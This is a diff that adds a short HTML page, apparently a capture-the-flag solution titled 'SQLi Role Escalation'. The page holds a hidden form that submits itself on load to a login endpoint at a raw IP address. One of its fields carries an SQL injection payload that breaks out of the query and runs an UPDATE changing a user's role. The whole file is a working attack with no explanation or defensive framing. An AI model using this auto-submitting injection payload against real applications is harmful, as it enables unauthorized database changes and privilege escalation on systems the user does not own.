@@ -1,0 +1,9 @@
+<!doctype html>
+<meta charset="utf-8">
+<title>ScrapScrap I Revenge – SQLi Role Escalation</title>
+<form id="pwn" action="http://91.107.176.228:4000/login" method="POST" target="_top" accept-charset="UTF-8">
+  <input type="hidden" name="username" value="YOUR_USER">
+  <input type="hidden" name="password" value="definitely-wrong-password">
+  <input type="hidden" name="log" value="x'); UPDATE users SET role='user' WHERE username='YOUR_USER';-- ">
+</form>
+<script>document.getElementById('pwn').submit()</script>
